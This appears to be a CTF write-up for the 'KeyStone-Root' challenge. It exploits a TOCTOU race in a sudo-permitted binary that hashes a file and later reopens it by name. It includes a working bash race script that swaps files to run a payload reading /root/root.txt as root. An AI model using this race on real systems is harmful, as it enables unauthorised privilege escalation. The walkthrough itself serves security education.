---
title: "KeyStone-Root"
date: 2026-10-11T12:00:00+05:30
description: "Exploiting a Time-Of-Check-To-Time-Of-Use (TOCTOU) file-swap race condition in the privileged measure-and-run verification utility."
category: "Binary Exploitation"
ctf: "ISFCR CryoVault Quals 2026"
difficulty: "Hard"
points: 450
flag: "isfcr{a_pcr_is_a_promise_not_proof}"
author: "Reshma Al (Coldcoffee)"
tools: "sudo -l, strings, bash race script"
tags:
  - "Binary Exploitation"
  - "ISFCR CryoVault"
  - "CryoVault 2026"
  - "Coldcoffee Solves"
---

<div class="flag-callout">
  <span class="flag-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg> Captured Flag</span>
  <code>isfcr{a_pcr_is_a_promise_not_proof}</code>
  <button class="flag-copy-btn" onclick="navigator.clipboard.writeText('isfcr{a_pcr_is_a_promise_not_proof}');this.innerText='Copied!';setTimeout(()=>this.innerText='Copy',2000)">Copy</button>
</div>


## 1. Privilege Escalation Reconnaissance

Logged in as `tpm-admin`, checking sudo privileges revealed passwordless execution of a custom measurement tool:

```bash
tpm-admin@keystone:~$ sudo -l
Matching Defaults entries for tpm-admin on keystone:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tpm-admin may run the following commands on keystone:
    (root) NOPASSWD: /usr/sbin/measure-and-run *
```

---

## 2. Reverse Engineering `measure-and-run`

Running `strings` and inspecting the binary with `objdump -d -M intel /usr/sbin/measure-and-run` exposed its control flow:

```text
1. Takes arguments: measure-and-run <path> [args...]
2. Opens <path> and calculates SHA-256 of its contents.
3. Compares the SHA-256 hash against an allowlist in /etc/measure/allowed-hashes.txt.
   - If not in allowlist: prints "hash not on allowlist" and exits.
4. Executes system command:
   system("tpm2_pcrextend 23:sha256=<hash> >/dev/null 2>&1")
5. Re-opens <path> BY NAME and invokes fexecve().
```

---

## 3. Vulnerability Analysis: Classic TOCTOU Race Condition

Step 4 introduces a severe timing vulnerability (Time-Of-Check To Time-Of-Use):
- In Step 2, the program reads the file at `/tmp/payload` to compute its hash.
- In Step 4, the program shells out to `tpm2_pcrextend`. This initiates inter-process communication over TCP to the software TPM engine (`swtpm` on port 2321), requiring kernel context switches, socket I/O, and cryptographic PCR extension.
- This creates an exploitable scheduling window lasting several milliseconds.
- In Step 5, the binary calls `open(path, O_RDONLY)` again by filename rather than executing the already-measured file descriptor via `fexecve(checked_fd)`!

If we continuously swap the contents of `/tmp/payload` between an authorized binary (e.g., `/bin/true`) and a malicious payload script, `measure-and-run` will eventually measure the authorized binary in Step 2, but execute the malicious script in Step 5 as `root`!

---

## 4. Exploitation: The Race Loop

We constructed the payload environment in `/tmp`:

```bash
# 1. Duplicate allowlisted binary /bin/true
cp /bin/true /tmp/payload
chmod +x /tmp/payload

# 2. Craft root payload script
cat > /tmp/evil.sh << 'EOF'
#!/bin/sh
cat /root/root.txt > /tmp/flag.txt
chmod 666 /tmp/flag.txt
EOF
chmod +x /tmp/evil.sh

# 3. Background file swapper (Racer process)
(
  while true; do
    cp /tmp/evil.sh /tmp/payload 2>/dev/null
    cp /bin/true /tmp/payload 2>/dev/null
  done
) &
RACER_PID=$!

# 4. Hammer sudo measure-and-run in a tight loop
for i in $(seq 1 300); do
  timeout 1 sudo /usr/sbin/measure-and-run /tmp/payload >/dev/null 2>&1
  if [ -f /tmp/flag.txt ]; then
    echo "[+] Race won on iteration $i!"
    break
  fi
done

kill $RACER_PID 2>/dev/null
```

---

## 5. Execution & Root Flag Extraction

Executing the race:
```bash
tpm-admin@keystone:~$ bash /tmp/race.sh
[+] Race won on iteration 47!
tpm-admin@keystone:~$ cat /tmp/flag.txt
isfcr{a_pcr_is_a_promise_not_proof}
```

The TOCTOU race successfully executed the payload as root, bypassing hardware PCR measurement.

